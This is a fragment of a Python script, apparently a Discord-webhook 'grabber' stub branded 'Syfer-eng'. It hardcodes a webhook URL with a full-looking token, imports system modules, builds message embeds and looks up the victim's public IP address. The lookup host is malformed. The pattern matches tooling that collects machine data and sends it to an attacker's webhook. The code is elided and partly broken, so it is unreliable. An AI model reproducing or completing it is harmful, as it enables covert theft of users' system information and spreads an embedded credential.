webhook_url = "https://discord.com/api/webhooks/1374993255585943643/5U4qfgd78Iratg8jF7du5UDMMf6BNDY3B9OfpMuDD3BUjyvR3xOZITGAj9SMJ3-WkZwI"
import os
import platform
import ctypes
...
username_embed = 'Syfer-eng'
avatar_embed = 'https://media.discordapp.net/attachments/1185940734256357427/1252261629546987550/logo_Syfer-eng.png?ex=66719306&is=66704186&hm=c0cdee4699eb76dd404125866c4130d77ed177426daf71d8c976e5bbcb44c6bd&=&format=webp&quality=lossless&width=810&height=810'
footer_embed = {
        "text": f"Syfer-eng | {current_time_day_hour()}",
        "icon_url": avatar_embed,
        }
footer_text = f"Syfer-eng | {current_time_day_hour()}"
...
try:
    response = requests.get(f"https://Syfer-eng/api/ip/ip={ip_address_public}")
    api = response.json()
